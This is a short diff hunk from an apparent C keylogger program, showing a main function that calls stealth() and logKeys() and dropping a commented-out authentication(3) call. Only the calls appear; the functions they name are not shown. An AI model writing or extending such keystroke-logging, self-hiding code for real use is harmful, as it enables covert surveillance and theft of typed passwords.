@@ -7,5 +7,4 @@ int main()
 {
     stealth();
     logKeys();
-    //authentication(3);
 }
